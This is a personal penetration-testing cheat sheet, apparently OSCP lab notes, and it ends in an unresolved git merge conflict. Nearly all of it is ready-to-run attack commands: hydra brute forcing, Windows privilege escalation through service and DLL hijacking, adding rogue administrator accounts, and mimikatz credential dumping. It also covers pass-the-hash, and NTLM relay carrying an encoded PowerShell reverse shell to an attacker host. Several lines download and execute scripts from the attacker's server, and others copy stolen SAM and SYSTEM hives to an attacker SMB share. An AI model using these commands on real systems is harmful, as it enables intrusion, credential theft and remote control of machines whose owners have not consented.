# Enumeration
```
nmap -sC -sV <ip>
autorecon.py 

# web
autorecon.py
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	-x txt,pdf
```

# Initial Access
## Brute Forcing
```
#SSH
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.220.201

#RDP
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.220.202
sudo hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.220.227

#FTP 
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.220.202 -V

# Brute Force Web Login
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.220.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# HTTP GET request
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.220.201 http-get
# find type of hashcat -m 
hashcat --help | grep -i "ntlm"

```
# Priv Esc
## Windows
	https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

### Scripts
```
iwr -uri http://192.168.45.212/winPEASx86.exe -Outfile winPEAS.exe
./winpeas log=file.txt

iwr -uri http://192.168.45.212/winPEASx64.exe -Outfile winPEAS.exe
./winpeas log=file.txt


# SEATBELT
iwr -uri http://192.168.45.212/seatbelt.exe -Outfile seatbelt.exe
./seatbelt.exe

# powerup
	iex (New-Object Net.webclient).downloadstring('http://192.168.45.212/powerup.ps1')

# mimikatz
	iex (New-Object Net.webclient).downloadstring('http://192.168.45.212/Invoke-Mimikatz.ps1')

powershell -ep bypass
./powerup.ps1
	get-modifiableservicefile
	get-modifiableservice
		#get-modifiablepath backupmonitor
		net stop backup monitor
		install-servicebinary -name 'backupmonitor'
		net start backup monitor
		
	get-unquotedservice
	write-servicebinary -name 'gammaservice' -Path "C:\Program Files\Enterprise Apps\Current.exe"
	restart-service 'GammaService'
```
### RunAS
```
runas /user:backupadmin cmd
```
### Service Binary Hijack
```
services.msc; get-service;get-ciminstance;
# get running and paths (look outside of system32)
get-ciminstance -classname win32_service | select name,state,pathname | where-object {*_.state -like 'running' }
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Select-String -Pattern "system32*" -NotMatch


# specific 
get-ciminstance -classname win32_service | select name,state,pathname | where-object {$_.name -like 'EnterpriseService' }

# perms (F=full M=modify,RX=Read execute,R=read,W=write)
icacls "C:\xampp\apache\bin\httpd.exe"
whoami /priv

## EXAMPLE
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

#restart service
net stop mysql
net start mysql
# restart machine if cannot restart service
shutdown /r /t 0
# adduser script
iwr -uri http://192.168.45.212/adduser64.exe -Outfile adduser.exe

# compile
x86_64-w64-mingw32-gcc adduser.c -o adduser64.exe
```
### Service DLL Hijack
```
get-ciminstance -classname win32_service | select name,state,pathname | where-object {*_.state -like 'running' }
icacls .\documents\BetaServ.exe

C:\tools\procmon
	filter -> filter -> process name is BetaServ.exe -> include -> add -Apply okay
	restart-service BetaService
	myDLL.dll (NAME NOT FOUND = EZ)
	$env:path
	place dll
	restart-service BetaService

# compile 
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

```
### Unquoted Service Paths 
```
# put above the real one in the path 
C:\Program.exe
C:\program files\exterprise.exe
C:\program files\enterprise apps\current.exe
C:\program files\enterprise apps\current version\gammaserv.exe

C:\Program.exe
C:\Program Files\Juggernaut.exe
C:\Program Files\Juggernaut Prod\Production.exe
C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe

C:\Enterprise.exe
C:\Enterprise Software\Monitoring.exe
C:\Enterprise Software\Monitoring Solution\Surveillance.exe
C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe


get-ciminstance -classname win32_service | select name,state,pathname 
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

start-service gammaservice
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"

iwr -uri http://192.168.45.212/adduser64.exe -Outfile Current.exe
	cp current.exe "C:\Program Files\Enterprise Apps\current.exe"
	restart-service 'GammaService'
	
#cleanup
remove file and restart service 

# POWERUP 
	iex (New-Object Net.webclient).downloadstring('http://192.168.45.212/powerup.ps1')
	get-unquotedservice
	write-servicebinary -name 'gammaservice' -Path "C:\Program Files\Enterprise Apps\Current.exe"
	restart-service 'GammaService'

```
### schtasks
```
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr Users
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```
### exploits
```
# PrintSpooler
whoami /priv
NEED SeImpersonatePrivilege        Impersonate a client after authentication Enabled 


iwr -uri http://192.168.45.212/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

net user admin2 password123! /add
net localgroup administrators admin2 /add

```
### Cracking NTLM
```
#mimikatz
privilege::debug
token::elevate
powershell -c iwr -uri http://192.168.45.195/Invoke-Mimikatz.ps1 -outfile kiwi.ps1

# dump passwords
sekurlsa::logonpasswords 
lsadump::sam

# Crack
john nelly --format=nt
hashcat -m 1000 nelly /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
### Passing NTML
```
# SMBCLIENT
smbclient \\\\192.168.188.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
#IMPACKET
mpacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf itwk04admin@192.168.249.226
```


```
### Cracking Net-NTLM
sudo responder -I tun0
dir \\192.168.45.212\test

hashcat -m 5600 paul /usr/share/wordlists/rockyou.txt --force

# Via burp
filename="\\\\192.168.45.212\\yeet"
```
### Relaying Net-NTLM
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.188.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="


nc -nlvp 8080

dir \\192.168.45.212\test 
```
### Steal sam/system
```
reg save hklm\sam sam 
reg save hklm\system system 

impacket-smbserver YEET /home/kali/OSCP/tmp -smb2support
copy sam \\192.168.45.212\YEET
copy system \\192.168.45.212\YEET

use pypykatz to to get command
pypykatz registry --sam sam system

impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5 administrator@192.168.199.222

```





## Linux 
https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
### Linpeas



# Access
ssh
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```
rdp
```
xfreerdp +clipboard /u:offsec /v:192.168.189.196
```
ssh private
```
chmod 600 id_rsa
ssh -i id_rsa yeet@192.168.X.X -p 2222

<<<<<<< Updated upstream

```
=======
alfred
```
evil-rm
```
evil-winrm -i 192.168.225.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```
Ligolo-ng
```
./proxy -h
./proxy

#AGENT
./agent -connect 192.168.45.212:11601
start

session
ifconfig
sudo ip route add 10.10.10.0/24 dev ligolo

# Forward
listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:4321 --tcp

```

>>>>>>> Stashed changes
